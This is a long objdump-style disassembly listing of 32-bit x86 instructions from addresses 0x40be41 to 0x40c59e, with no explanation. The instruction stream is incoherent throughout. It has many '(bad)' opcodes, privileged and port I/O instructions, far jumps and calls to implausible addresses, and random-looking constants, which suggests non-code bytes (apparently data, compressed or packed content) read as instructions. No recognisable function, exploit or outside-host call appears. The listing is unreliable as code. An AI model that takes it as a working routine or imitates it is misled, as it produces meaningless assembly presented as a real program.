  40be41:	jmp    0xb520:0x7a32696e
  40be48:	cmp    dh,cl
  40be4a:	lods   al,BYTE PTR ds:[esi]
  40be4b:	fisubr DWORD PTR [ecx-0x4acf3244]
  40be51:	outs   dx,DWORD PTR ds:[esi]
  40be52:	xor    dl,ch
  40be54:	rcr    ah,cl
  40be56:	mov    edi,0xc305d014
  40be5b:	push   eax
  40be5c:	ret    0xba41
  40be5f:	cwde   
  40be60:	inc    eax
  40be61:	or     DWORD PTR [esi-0x21],0xc
  40be65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be66:	push   ebx
  40be67:	aas    
  40be68:	aam    0x9f
  40be6a:	rcl    BYTE PTR [esi],cl
  40be6c:	leave  
  40be6d:	adc    bh,BYTE PTR [ecx]
  40be6f:	xchg   edi,eax
  40be70:	push   ds
  40be71:	lods   al,BYTE PTR ds:[esi]
  40be72:	mov    ebx,ecx
  40be74:	ds push es
  40be76:	and    BYTE PTR [edi],ah
  40be78:	or     DWORD PTR [eax+0x238961fa],esp
  40be7e:	cmp    al,0x98
  40be80:	aas    
  40be81:	mov    edx,0xea10dc6
  40be86:	cmp    BYTE PTR [ebp+0x1159b627],dh
  40be8c:	xor    BYTE PTR [ebp+0x21c943d8],ch
  40be92:	push   esp
  40be93:	imul   esi,DWORD PTR [eax+0x19d9bcd7],0xfffffff9
  40be9a:	ss aas 
  40be9c:	lahf   
  40be9d:	aad    0x75
  40be9f:	fwait
  40bea0:	daa    
  40bea1:	push   ebp
  40bea2:	hlt    
  40bea3:	push   ecx
  40bea4:	adc    edi,DWORD PTR [ebp-0x3044fcbe]
  40beaa:	adc    eax,0x7262adde
  40beaf:	mov    al,ds:0x499d98c0
  40beb4:	mov    cl,0x40
  40beb6:	in     al,dx
  40beb7:	fsub   DWORD PTR [ecx+eax*1]
  40beba:	daa    
  40bebb:	push   ss
  40bebc:	pop    edi
  40bebd:	jns    0x40beb3
  40bebf:	xor    ecx,edx
  40bec1:	mov    DWORD PTR [edi-0x53a1af8a],edx
  40bec7:	inc    eax
  40bec8:	xor    eax,0xbc45946a
  40becd:	int3   
  40bece:	neg    DWORD PTR [edx]
  40bed0:	push   ds
  40bed1:	stos   DWORD PTR es:[edi],eax
  40bed2:	stos   BYTE PTR es:[edi],al
  40bed3:	ficom  DWORD PTR [edi-0x22]
  40bed6:	push   esp
  40bed7:	scas   al,BYTE PTR es:[edi]
  40bed8:	iret   
  40bed9:	xlat   BYTE PTR ds:[ebx]
  40beda:	or     eax,0x91ffc328
  40bedf:	test   eax,0x34dadc46
  40bee4:	mov    al,ds:0x695630c
  40bee9:	leave  
  40beea:	outs   dx,DWORD PTR ds:[esi]
  40beeb:	adc    DWORD PTR [esi-0x2e],esi
  40beee:	and    ch,BYTE PTR ds:0x64d3276a
  40bef4:	push   di
  40bef6:	mov    ?,WORD PTR [ebp+0x371986d3]
  40befc:	jg     0x40be9e
  40befe:	out    dx,al
  40beff:	jecxz  0x40bf19
  40bf01:	dec    edx
  40bf02:	and    eax,ecx
  40bf04:	xchg   esi,eax
  40bf05:	inc    ebx
  40bf06:	daa    
  40bf07:	aaa    
  40bf08:	rcr    DWORD PTR [ecx+ebp*8],1
  40bf0b:	fdivr  DWORD PTR [edx+0x36b8c0a3]
  40bf11:	and    ecx,0x5a
  40bf14:	mov    dh,0xcd
  40bf16:	cs mov esi,0x9120670c
  40bf1c:	dec    ebp
  40bf1d:	xchg   ecx,eax
  40bf1e:	outs   dx,BYTE PTR ds:[esi]
  40bf1f:	shr    BYTE PTR [edx+0x70492d8f],0xa
  40bf26:	lods   al,BYTE PTR ds:[esi]
  40bf27:	add    bh,BYTE PTR fs:[ecx+0x63]
  40bf2b:	rol    bl,cl
  40bf2d:	pop    eax
  40bf2e:	test   al,0xd1
  40bf30:	mov    ebp,0xb3d5c7f7
  40bf35:	and    edx,ecx
  40bf37:	cmp    eax,0x480fbbf
  40bf3c:	(bad)  
  40bf3d:	cdq    
  40bf3e:	lods   al,BYTE PTR ds:[esi]
  40bf3f:	push   es
  40bf40:	sbb    al,ch
  40bf42:	outs   dx,BYTE PTR ds:[esi]
  40bf43:	inc    esi
  40bf44:	imul   eax,DWORD PTR [edx+0x17],0x74
  40bf48:	inc    eax
  40bf49:	sbb    al,0x7a
  40bf4b:	xor    BYTE PTR [ecx+0x1dbe7c33],0xde
  40bf52:	cmp    al,0x37
  40bf54:	xor    eax,0x8f1c0e00
  40bf59:	adc    esp,ecx
  40bf5b:	std    
  40bf5c:	aad    0x1a
  40bf5e:	mov    esi,0x3980b73d
  40bf63:	inc    ecx
  40bf64:	push   ds
  40bf65:	jno    0x40bf16
  40bf67:	inc    edx
  40bf68:	jle    0x40bf78
  40bf6a:	sbb    al,0x3a
  40bf6c:	(bad)  
  40bf6d:	js     0x40bf48
  40bf6f:	out    dx,eax
  40bf70:	and    dl,BYTE PTR [ebx]
  40bf72:	inc    esi
  40bf73:	arpl   sp,cx
  40bf75:	mov    ds:0x741ea4a6,eax
  40bf7a:	out    0x87,eax
  40bf7c:	arpl   WORD PTR [ecx],dx
  40bf7e:	enter  0x6e77,0x69
  40bf82:	xchg   ebp,eax
  40bf83:	xchg   edx,eax
  40bf84:	lods   al,BYTE PTR ds:[esi]
  40bf85:	retf   
  40bf86:	mov    al,ds:0x43a32d23
  40bf8b:	leave  
  40bf8c:	repz and BYTE PTR cs:[edi-0x78c929e9],bh
  40bf94:	dec    esp
  40bf95:	popa   
  40bf96:	mov    es,WORD PTR [edx]
  40bf98:	or     BYTE PTR [edi+0x54],0x22
  40bf9c:	inc    ecx
  40bf9d:	add    bh,bh
  40bf9f:	mov    WORD PTR [edx+0xc],cs
  40bfa2:	jge    0x40bf78
  40bfa4:	jl     0x40bf82
  40bfa6:	mov    bl,0x96
  40bfa8:	pop    esp
  40bfa9:	mov    cs:0xbdbb9461,eax
  40bfaf:	repz cmp eax,0xab31371e
  40bfb5:	dec    eax
  40bfb6:	or     DWORD PTR [edi-0x40d20c98],edi
  40bfbc:	lds    esi,FWORD PTR [ecx+0x7d]
  40bfbf:	jae    0x40bfdd
  40bfc1:	sbb    ah,BYTE PTR [eax]
  40bfc3:	mov    ebx,0xe727927f
  40bfc8:	lahf   
  40bfc9:	push   ebp
  40bfca:	xchg   esi,eax
  40bfcb:	test   DWORD PTR [esi],eax
  40bfcd:	fist   DWORD PTR [edi+0xb14e2b8]
  40bfd3:	out    dx,eax
  40bfd4:	adc    ebp,DWORD PTR [edi+0x38]
  40bfd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfd8:	idiv   BYTE PTR [ecx-0x5fbfe4ed]
  40bfde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfdf:	adc    eax,0xa7b9cc26
  40bfe4:	pcmpeqd mm7,QWORD PTR [eax+0x66]
  40bfe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfe9:	loope  0x40c05f
  40bfeb:	inc    eax
  40bfec:	add    BYTE PTR [esi+ebx*1+0x4cc5b452],al
  40bff3:	adc    eax,0xad63fc71
  40bff8:	ja     0x40bfc7
  40bffa:	jne    0x40c00f
  40bffc:	daa    
  40bffd:	push   cs
  40bffe:	push   ebp
  40bfff:	jae    0x40c053
  40c001:	mov    edi,0x406e6cb7
  40c006:	jg     0x40bfb2
  40c008:	pop    es
  40c009:	mov    bl,0xc5
  40c00b:	xchg   ecx,eax
  40c00c:	and    BYTE PTR [edi+0x4],0xd
  40c010:	inc    ecx
  40c011:	dec    eax
  40c012:	repz je 0x40c08c
  40c015:	pop    ecx
  40c016:	mov    bh,0xde
  40c018:	nop
  40c019:	cmp    ecx,DWORD PTR [eax*8+0x1b121b6d]
  40c020:	fstp   QWORD PTR [ebx+eax*2]
  40c023:	xor    BYTE PTR [esi-0x81c20d7],al
  40c029:	xchg   DWORD PTR [ecx-0x13],ebp
  40c02c:	aad    0x5d
  40c02e:	sbb    bl,dh
  40c030:	aad    0xf6
  40c032:	je     0x40c02b
  40c034:	and    eax,0xf4848de4
  40c039:	xchg   BYTE PTR ds:0xda04d23a,dh
  40c03f:	(bad)  [ebp-0x3af64b8a]
  40c045:	push   esp
  40c046:	xchg   BYTE PTR [ebx-0x6afd2d52],dl
  40c04c:	mov    ecx,DWORD PTR [esi]
  40c04e:	cmp    ebp,esi
  40c050:	adc    al,0xef
  40c052:	dec    DWORD PTR [edx-0x72]
  40c055:	es leave 
  40c057:	fs ds adc eax,0x865585f2
  40c05e:	ss addr16 dec edi
  40c061:	jb     0x40bff2
  40c063:	fisub  WORD PTR [edi-0x2072aed8]
  40c069:	push   esi
  40c06a:	xchg   ebx,ecx
  40c06c:	les    esi,FWORD PTR [eax]
  40c06e:	fwait
  40c06f:	and    al,0xf
  40c071:	loope  0x40c015
  40c073:	push   esi
  40c074:	pusha  
  40c075:	push   esi
  40c076:	test   eax,0xf4bfa675
  40c07b:	bound  ecx,QWORD PTR [eax]
  40c07d:	dec    esp
  40c07e:	ss icebp 
  40c080:	shl    BYTE PTR [ebp+edi*1-0x53],1
  40c084:	pop    edx
  40c085:	mov    WORD PTR [ebx+edx*4-0x63],ss
  40c089:	retf   
  40c08a:	adc    cl,cl
  40c08c:	lock inc esp
  40c08e:	gs cld 
  40c090:	sbb    al,0x61
  40c092:	inc    ecx
  40c093:	adc    cl,cl
  40c095:	xor    esi,DWORD PTR [ebx-0xd3ad52c]
  40c09b:	and    dh,BYTE PTR [ebx-0x8]
  40c09e:	dec    ecx
  40c09f:	push   esi
  40c0a0:	fcmovne st,st(5)
  40c0a2:	std    
  40c0a3:	pop    esp
  40c0a4:	out    0x75,al
  40c0a6:	cmp    ah,BYTE PTR [ebx]
  40c0a8:	fwait
  40c0a9:	test   al,0x24
  40c0ab:	mov    eax,ds:0x31dc0b42
  40c0b0:	call   0x235d14a4
  40c0b5:	sbb    al,0xef
  40c0b7:	loope  0x40c05f
  40c0b9:	test   al,0xcf
  40c0bb:	inc    esp
  40c0bc:	fs imul eax,esp,0x602cfe30
  40c0c3:	fst    DWORD PTR [esi+0xce2371c]
  40c0c9:	cs adc al,0x3
  40c0cc:	imul   esi,DWORD PTR [ecx-0x7e],0xffffffb3
  40c0d0:	imul   esi,ecx,0xfeccfabe
  40c0d6:	aas    
  40c0d7:	dec    esp
  40c0d8:	fadd   DWORD PTR [ecx+edx*2]
  40c0db:	xor    ah,BYTE PTR [ecx+0x1c15f92c]
  40c0e1:	cmc    
  40c0e2:	mov    bl,0x50
  40c0e4:	fidivr WORD PTR [ebx-0x45]
  40c0e7:	outs   dx,BYTE PTR ds:[esi]
  40c0e8:	and    al,BYTE PTR [esi]
  40c0ea:	lock mov ah,0xe
  40c0ed:	cmc    
  40c0ee:	stos   BYTE PTR es:[edi],al
  40c0ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0f0:	(bad)  
  40c0f2:	add    eax,0x34b99714
  40c0f7:	shl    BYTE PTR [ebp-0x644bd2a0],cl
  40c0fd:	cmp    al,bh
  40c0ff:	int3   
  40c100:	arpl   WORD PTR [edi+0x2],sp
  40c103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c104:	sar    BYTE PTR [eax],1
  40c106:	xchg   ecx,eax
  40c107:	push   esi
  40c108:	inc    esi
  40c109:	jecxz  0x40c0f7
  40c10b:	nop
  40c10c:	mov    edx,0xeda2fd7e
  40c111:	push   ebx
  40c112:	fwait
  40c113:	ror    DWORD PTR [ebx+ecx*4+0x3a16e0],cl
  40c11a:	(bad)  
  40c11b:	imul   edi,DWORD PTR [eax-0x1cc867e8],0x31
  40c122:	inc    edi
  40c123:	pop    edi
  40c124:	adc    edx,DWORD PTR [ebx+0x66]
  40c127:	adc    bl,0x2a
  40c12a:	pavgw  mm3,QWORD PTR [ebp+0x7f]
  40c12e:	cmp    al,BYTE PTR [eax+0x28be6782]
  40c134:	(bad)  
  40c135:	loope  0x40c135
  40c137:	les    ecx,FWORD PTR [eax]
  40c139:	lds    ebp,FWORD PTR [ecx-0x416d00d1]
  40c13f:	xchg   edi,eax
  40c140:	packuswb mm2,QWORD PTR [ebp-0x42]
  40c144:	jns    0x40c13a
  40c146:	add    eax,0x3ccd536f
  40c14b:	cmp    DWORD PTR [edx+0x733b622d],ebp
  40c151:	inc    ebx
  40c152:	and    DWORD PTR [ecx+esi*2-0x1b2fed18],edi
  40c159:	push   eax
  40c15a:	sub    al,0x53
  40c15c:	add    DWORD PTR ds:0x44aa910b,edx
  40c162:	icebp  
  40c163:	out    0x10,eax
  40c165:	test   DWORD PTR [esi+edi*1+0x1eb3d37e],ebx
  40c16c:	sub    dh,al
  40c16e:	xchg   edx,eax
  40c16f:	xchg   edx,eax
  40c170:	xor    esp,esi
  40c172:	std    
  40c173:	retf   0xd7c4
  40c176:	or     eax,ecx
  40c178:	imul   esp,DWORD PTR [ecx+0x39],0x5c4c01e4
  40c17f:	and    DWORD PTR [eax+0x2f],ecx
  40c182:	push   cs
  40c183:	jg     0x40c185
  40c185:	dec    BYTE PTR [ebx]
  40c187:	xor    ecx,DWORD PTR cs:[eax-0x2d719194]
  40c18e:	push   ecx
  40c18f:	dec    ecx
  40c190:	ret    0xa3e5
  40c193:	repz jg 0x40c1b5
  40c196:	xchg   ecx,eax
  40c197:	cs popf 
  40c199:	push   es
  40c19a:	cmp    ecx,DWORD PTR [edi+0x78]
  40c19d:	fwait
  40c19e:	outs   dx,BYTE PTR ds:[esi]
  40c19f:	jb     0x40c14f
  40c1a1:	or     esi,ebp
  40c1a3:	mov    esi,0x7ba4ac3d
  40c1a8:	repnz adc al,0x38
  40c1ab:	sahf   
  40c1ac:	inc    ecx
  40c1ad:	fwait
  40c1ae:	mov    cl,0xc4
  40c1b0:	and    BYTE PTR [esi+0x5],ah
  40c1b3:	vfnmsub231ps ymm5,ymm2,YMMWORD PTR [edi+ebx*2]
  40c1b9:	and    eax,0x3ced43d
  40c1be:	(bad)  
  40c1c0:	loopne 0x40c165
  40c1c2:	lea    eax,[eax]
  40c1c4:	out    dx,al
  40c1c5:	fidivr WORD PTR [edi+0x741b2d7c]
  40c1cb:	jecxz  0x40c1b4
  40c1cd:	test   DWORD PTR gs:[ecx],ebx
  40c1d0:	xor    edx,esp
  40c1d2:	sub    si,sp
  40c1d5:	cs push edi
  40c1d7:	je     0x40c1aa
  40c1d9:	mov    edi,DWORD PTR [edx]
  40c1db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1dc:	inc    edx
  40c1dd:	inc    edx
  40c1de:	adc    al,0xcc
  40c1e0:	mov    eax,DWORD PTR [edx-0x5a6b91d]
  40c1e6:	sbb    edx,DWORD PTR gs:[edx-0x35]
  40c1ea:	push   ecx
  40c1eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ec:	push   edi
  40c1ed:	fucomp st(2)
  40c1ef:	cmp    eax,0xcead77e0
  40c1f4:	cmc    
  40c1f5:	imul   ecx,DWORD PTR [ebx],0x4bab9ff4
  40c1fb:	ss dec ebx
  40c1fd:	dec    ebx
  40c1fe:	xor    edx,ebx
  40c200:	inc    edx
  40c201:	mov    dh,BYTE PTR [eax]
  40c203:	outs   dx,DWORD PTR ds:[esi]
  40c204:	dec    edi
  40c205:	inc    edx
  40c206:	jmp    0xd3b1:0x5ce16d4
  40c20d:	fucomi st,st(0)
  40c20f:	dec    esi
  40c210:	bound  edx,QWORD PTR [eax+esi*8-0x6c5fd99b]
  40c217:	mov    ah,0x53
  40c219:	ret    0xcace
  40c21c:	(bad)  
  40c21d:	int    0x5e
  40c21f:	push   ebx
  40c220:	or     DWORD PTR [edi-0x29],eax
  40c223:	pop    ebx
  40c224:	rcr    esp,1
  40c226:	xchg   edx,eax
  40c227:	mov    esp,0xf8be9665
  40c22c:	inc    edx
  40c22d:	adc    DWORD PTR ds:0x7fcd73b6,ebx
  40c233:	dec    ebx
  40c234:	mov    bl,ah
  40c236:	push   0xffffffbc
  40c238:	and    eax,0x3386d213
  40c23d:	mov    eax,ds:0x4183c190
  40c242:	fmul   QWORD PTR [eax-0x8]
  40c245:	data16 jae 0x40c26c
  40c248:	data16 cmp ch,BYTE PTR [eax+0x59]
  40c24c:	popa   
  40c24d:	popa   
  40c24e:	mov    edi,0x90d61b7f
  40c253:	inc    esp
  40c254:	(bad)  
  40c255:	push   esp
  40c256:	push   ebx
  40c257:	outs   dx,BYTE PTR ds:[esi]
  40c258:	xchg   edx,eax
  40c259:	mov    ss,WORD PTR [ebx-0xb]
  40c25c:	pop    es
  40c25d:	sbb    al,0x3b
  40c25f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c260:	and    eax,esp
  40c262:	mov    ds:0x9382eadd,eax
  40c267:	xor    al,ah
  40c269:	aas    
  40c26a:	push   esp
  40c26b:	adc    eax,0x5f00f9bf
  40c270:	sbb    edi,DWORD PTR [ebx]
  40c272:	les    ebx,FWORD PTR [eax+0x61]
  40c275:	and    DWORD PTR [ecx-0x32],edx
  40c278:	or     DWORD PTR [ebx+0x4eaef2dd],edi
  40c27e:	(bad)  
  40c27f:	loop   0x40c22c
  40c281:	dec    ebp
  40c282:	dec    eax
  40c283:	popa   
  40c284:	ins    DWORD PTR es:[edi],dx
  40c285:	inc    ebp
  40c286:	mov    ds:0x442deaa,eax
  40c28b:	fstp   TBYTE PTR [eax-0x5bc2ec99]
  40c291:	pop    ds
  40c292:	aam    0xcc
  40c294:	push   ebp
  40c295:	sahf   
  40c296:	jecxz  0x40c246
  40c298:	dec    ebx
  40c299:	inc    ecx
  40c29a:	enter  0xe480,0xc0
  40c29e:	xor    ah,BYTE PTR [ecx+0xdef86b2]
  40c2a4:	push   ebx
  40c2a5:	sub    BYTE PTR [eax+0x38],0x39
  40c2a9:	pop    edi
  40c2aa:	sub    DWORD PTR [edx],ebp
  40c2ac:	pop    ebx
  40c2ad:	aas    
  40c2ae:	jmp    FWORD PTR [ebp+0x6759e156]
  40c2b4:	xchg   esp,eax
  40c2b5:	shl    cl,0x3f
  40c2b8:	push   eax
  40c2b9:	xor    BYTE PTR [esi-0x69],0xed
  40c2bd:	enter  0x7cae,0xb0
  40c2c1:	and    al,0xbc
  40c2c3:	in     al,0x41
  40c2c5:	xchg   edx,eax
  40c2c6:	into   
  40c2c7:	inc    edi
  40c2c8:	jp     0x40c24f
  40c2ca:	pop    edi
  40c2cb:	inc    ecx
  40c2cc:	(bad)  
  40c2cd:	xor    BYTE PTR [ebp-0x1693be06],dl
  40c2d3:	sub    BYTE PTR [edx-0x39d35ca5],cl
  40c2d9:	mov    al,0xea
  40c2db:	add    al,0xb7
  40c2dd:	or     dl,dl
  40c2df:	xor    eax,0x54710ad7
  40c2e4:	mov    al,ds:0xef9fee34
  40c2e9:	dec    eax
  40c2ea:	test   al,0xd7
  40c2ec:	loop   0x40c317
  40c2ee:	cmp    DWORD PTR [edx+0x4582747a],0xffffffe0
  40c2f5:	xchg   esi,eax
  40c2f6:	mov    BYTE PTR [ebp*8+0x7cd754a],cl
  40c2fd:	sbb    al,0x74
  40c2ff:	adc    al,0xaa
  40c301:	fcomp  DWORD PTR [edx]
  40c303:	fadd   QWORD PTR [ecx-0x44eda2be]
  40c309:	push   ecx
  40c30a:	pop    esi
  40c30b:	lods   eax,DWORD PTR ds:[esi]
  40c30c:	push   es
  40c30d:	dec    esp
  40c30e:	sbb    BYTE PTR [ebp-0x432d10c6],0x18
  40c315:	std    
  40c316:	stos   BYTE PTR es:[edi],al
  40c317:	(bad)  
  40c318:	pop    ss
  40c319:	xchg   esi,eax
  40c31a:	mov    DWORD PTR [edx],0x418b364e
  40c320:	fucomi st,st(4)
  40c322:	mov    eax,0xf62073a0
  40c327:	push   ebp
  40c328:	inc    esp
  40c329:	add    eax,0xa403d98f
  40c32e:	sub    BYTE PTR [edi+0x31],bh
  40c331:	test   al,0xb7
  40c333:	add    eax,0x9302fb7b
  40c338:	sbb    eax,DWORD PTR [edi+eiz*8-0x7e]
  40c33c:	and    DWORD PTR [edi+0x2c],0xffffffbb
  40c340:	cmp    BYTE PTR [ebx-0x2b3757be],dh
  40c346:	fcomp  QWORD PTR [edi-0x7fc567fb]
  40c34c:	fcmovbe st,st(7)
  40c34e:	pop    ebp
  40c34f:	gs scas al,BYTE PTR es:[edi]
  40c351:	and    DWORD PTR [ebp+0xbafb8b1],ebx
  40c357:	mov    bh,0x1a
  40c359:	mov    eax,0xd5149897
  40c35e:	aaa    
  40c35f:	(bad)  
  40c360:	fidiv  WORD PTR [eax+0x4d35f1c8]
  40c366:	xchg   ebx,eax
  40c367:	(bad)  
  40c368:	fnsave [ecx+edi*4]
  40c36b:	push   ebp
  40c36c:	jno    0x40c33d
  40c36e:	adc    ebp,DWORD PTR [ebx-0x3b]
  40c371:	jne    0x40c3c2
  40c373:	inc    ecx
  40c374:	add    DWORD PTR [edi-0x745a30bf],esp
  40c37a:	push   esp
  40c37b:	int    0xf0
  40c37d:	ins    BYTE PTR es:[edi],dx
  40c37e:	imul   edi,DWORD PTR es:[eax-0x142f5c72],0x21
  40c386:	lds    ebx,FWORD PTR ds:0x32100968
  40c38c:	push   0xffffff94
  40c38e:	not    BYTE PTR [edi+0x2d]
  40c391:	xchg   edi,eax
  40c392:	mov    cl,0x19
  40c394:	int    0x44
  40c396:	adc    ch,BYTE PTR [ebp-0x42]
  40c399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c39a:	mov    eax,0xb655d13c
  40c39f:	fidiv  DWORD PTR [ebx+0x7cc925f2]
  40c3a5:	stos   BYTE PTR es:[edi],al
  40c3a6:	mov    gs,WORD PTR [ecx-0x616c1d56]
  40c3ac:	fstp   st(3)
  40c3ae:	jg     0x40c35a
  40c3b0:	xor    DWORD PTR [ebp+0x2e54af41],esp
  40c3b6:	rcr    DWORD PTR [eax+esi*2],cl
  40c3b9:	call   0xe7e74ce4
  40c3be:	fsubr  QWORD PTR [edx+0x2b0c8b26]
  40c3c4:	xchg   ebp,eax
  40c3c5:	aaa    
  40c3c6:	xor    BYTE PTR [esi-0x2337e76a],ch
  40c3cc:	sbb    DWORD PTR [ecx-0x3ae9ef51],eax
  40c3d2:	test   eax,0xfb007f4b
  40c3d7:	xchg   edx,ecx
  40c3d9:	ins    DWORD PTR es:[edi],dx
  40c3da:	adc    BYTE PTR [edx+0x63],dl
  40c3dd:	push   cs
  40c3de:	mov    ds:0xed6464f4,eax
  40c3e3:	scas   al,BYTE PTR es:[edi]
  40c3e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3e5:	addr16 iret 
  40c3e7:	inc    edx
  40c3e8:	imul   edi,DWORD PTR [edx-0x34],0xaa0c527d
  40c3ef:	inc    esp
  40c3f0:	cmp    eax,0xeaff1bf9
  40c3f5:	push   ebx
  40c3f6:	jg     0x40c440
  40c3f8:	test   eax,0xf125207
  40c3fd:	mov    dh,0x2
  40c3ff:	add    DWORD PTR [eax-0x6b],esi
  40c402:	shl    DWORD PTR [ecx-0x1f],1
  40c405:	dec    ecx
  40c406:	js     0x40c3ae
  40c408:	fstp   QWORD PTR [ebx]
  40c40a:	dec    esi
  40c40b:	xchg   esi,eax
  40c40c:	adc    ch,BYTE PTR [ecx]
  40c40e:	mov    eax,0x787ad0cf
  40c413:	lock mov esp,DWORD PTR [edx+ecx*4-0x2bd307ec]
  40c41b:	cwde   
  40c41c:	enter  0xd6ff,0x48
  40c420:	mov    BYTE PTR [edi],ah
  40c422:	xchg   ebx,eax
  40c423:	sti    
  40c424:	out    0x4a,al
  40c426:	add    DWORD PTR [edi+0x12da6611],esi
  40c42c:	xchg   edi,eax
  40c42d:	xchg   edi,eax
  40c42e:	cs push 0xffffffc6
  40c431:	shl    DWORD PTR [edi+esi*1],1
  40c434:	sub    BYTE PTR [edx],0x84
  40c437:	and    BYTE PTR [edx-0x1d],dh
  40c43a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c43b:	add    dh,BYTE PTR [ebp-0x696dcfb9]
  40c441:	or     DWORD PTR [eax-0x55],edx
  40c444:	mov    ds:0x748a4785,al
  40c449:	xchg   esi,eax
  40c44a:	pop    esi
  40c44b:	rcr    DWORD PTR [edi-0x2a],0xe2
  40c44f:	push   ecx
  40c450:	sub    eax,0xdfaa4171
  40c455:	xchg   ebp,eax
  40c456:	dec    esi
  40c457:	inc    eax
  40c458:	push   ebx
  40c459:	in     eax,0xe2
  40c45b:	fxch   st(0)
  40c45d:	stos   BYTE PTR es:[edi],al
  40c45e:	js     0x40c45c
  40c460:	sbb    eax,0x88ab7dc1
  40c465:	sbb    ebp,DWORD PTR [eax+0x6]
  40c468:	in     al,dx
  40c469:	cld    
  40c46a:	in     eax,dx
  40c46b:	xor    edx,DWORD PTR [esi+0x177097e]
  40c471:	(bad)  
  40c472:	in     eax,dx
  40c473:	bound  esp,QWORD PTR [esi]
  40c475:	xor    eax,0x6071bbe3
  40c47a:	(bad)  [ebx]
  40c47c:	mov    ds:0x34eab717,eax
  40c481:	inc    esi
  40c482:	xchg   edi,eax
  40c483:	ins    BYTE PTR es:[edi],dx
  40c484:	push   eax
  40c485:	jg     0x40c44d
  40c487:	jnp    0x40c4ea
  40c489:	test   edi,ebx
  40c48b:	hlt    
  40c48c:	and    edx,DWORD PTR [ebx-0x1c]
  40c48f:	mov    ebx,0x393451d1
  40c494:	cmp    esi,DWORD PTR [ebp+0x4593375b]
  40c49a:	test   BYTE PTR [edx],bh
  40c49c:	dec    ecx
  40c49d:	pop    esi
  40c49e:	lods   eax,DWORD PTR ds:[esi]
  40c49f:	push   eax
  40c4a0:	inc    BYTE PTR [ebp-0x12]
  40c4a3:	dec    esp
  40c4a4:	mov    ds:0x65e3d5e,al
  40c4a9:	cmp    al,0xe2
  40c4ab:	mov    es,WORD PTR [ebx+ebx*1]
  40c4ae:	fld    TBYTE PTR [edx+0x3038c646]
  40c4b4:	test   BYTE PTR [ecx],dl
  40c4b6:	test   eax,0xae84ac66
  40c4bb:	fwait
  40c4bc:	mov    ch,0x49
  40c4be:	hlt    
  40c4bf:	aas    
  40c4c0:	and    eax,0x7c803f24
  40c4c5:	outs   dx,BYTE PTR gs:[esi]
  40c4c7:	in     eax,dx
  40c4c8:	pop    edi
  40c4c9:	inc    edx
  40c4ca:	ret    
  40c4cb:	jnp    0x40c52c
  40c4cd:	jo     0x40c4d1
  40c4cf:	mov    eax,ds:0x771de6d7
  40c4d4:	fisub  DWORD PTR [ecx+0x10]
  40c4d7:	clc    
  40c4d8:	xchg   edi,eax
  40c4d9:	or     al,0x10
  40c4db:	dec    ebx
  40c4dc:	fcmovbe st,st(2)
  40c4de:	adc    edx,edx
  40c4e0:	add    al,0x2a
  40c4e2:	push   esi
  40c4e3:	xchg   ecx,eax
  40c4e4:	das    
  40c4e5:	cdq    
  40c4e6:	stos   BYTE PTR es:[edi],al
  40c4e7:	gs xor cl,dl
  40c4ea:	(bad)  
  40c4eb:	mov    gs,esp
  40c4ed:	xor    BYTE PTR [edi],cl
  40c4ef:	push   ds
  40c4f0:	out    dx,al
  40c4f1:	outs   dx,DWORD PTR ds:[esi]
  40c4f2:	cmp    al,0x9c
  40c4f4:	jnp    0x40c47f
  40c4f6:	sub    DWORD PTR [ecx-0x483a0afc],eax
  40c4fc:	xor    ebx,0xffffff94
  40c4ff:	mov    ds:0x348fbaf8,al
  40c504:	je     0x40c528
  40c506:	lea    esi,[esi+eax*1+0x5127a922]
  40c50d:	xlat   BYTE PTR ds:[ebx]
  40c50e:	call   0xfc4f96d4
  40c513:	push   edi
  40c514:	ja     0x40c577
  40c516:	xchg   ebx,eax
  40c517:	stc    
  40c518:	cmp    eax,0x2f1d96da
  40c51d:	or     al,0x79
  40c51f:	shl    BYTE PTR [edi],0x28
  40c522:	pop    ds
  40c523:	mul    DWORD PTR [ebx+0xd]
  40c526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c527:	xchg   ebx,eax
  40c528:	push   0x116778f7
  40c52d:	jle    0x40c521
  40c52f:	leave  
  40c530:	mov    ebx,DWORD PTR [eax+0x282c9dec]
  40c536:	cmp    eax,0x31fbb2bd
  40c53b:	jecxz  0x40c594
  40c53d:	push   ss
  40c53e:	push   eax
  40c53f:	fcmovnbe st,st(2)
  40c541:	sub    bh,BYTE PTR [eax-0x57]
  40c544:	xor    BYTE PTR [ebx-0x5ebdc84],0x28
  40c54b:	and    BYTE PTR [edx],cl
  40c54d:	push   esi
  40c54e:	xchg   edi,eax
  40c54f:	and    BYTE PTR [ebx],0x47
  40c552:	pop    esi
  40c553:	adc    esi,DWORD PTR [edi+0x13bdd5fb]
  40c559:	xor    eax,0xafed4ffb
  40c55e:	xor    DWORD PTR [eax-0x3f51f9e9],0x32
  40c565:	jp     0x40c591
  40c567:	enter  0x45ea,0x35
  40c56b:	inc    edx
  40c56c:	push   esp
  40c56d:	and    al,bl
  40c56f:	lods   al,BYTE PTR ds:[esi]
  40c570:	outs   dx,BYTE PTR ds:[esi]
  40c571:	or     BYTE PTR [edx-0x26],bl
  40c574:	mov    bh,0x8a
  40c576:	sub    DWORD PTR [ebx],ebx
  40c578:	mov    dl,0x7a
  40c57a:	ret    
  40c57b:	std    
  40c57c:	or     BYTE PTR [eax],dh
  40c57e:	in     al,dx
  40c57f:	mov    eax,ds:0x405a7b38
  40c584:	adc    eax,0x53ed4b06
  40c589:	imul   ebx,DWORD PTR [edx+ebp*8+0x60970c7f],0xffffffa1
  40c591:	pop    eax
  40c592:	fnstcw WORD PTR [eax+0x74eec804]
  40c598:	pop    ss
  40c599:	std    
  40c59a:	into   
  40c59b:	mov    BYTE PTR [edi-0x74],al
  40c59e:	cmp    BYTE PTR [edi+0x61],ah
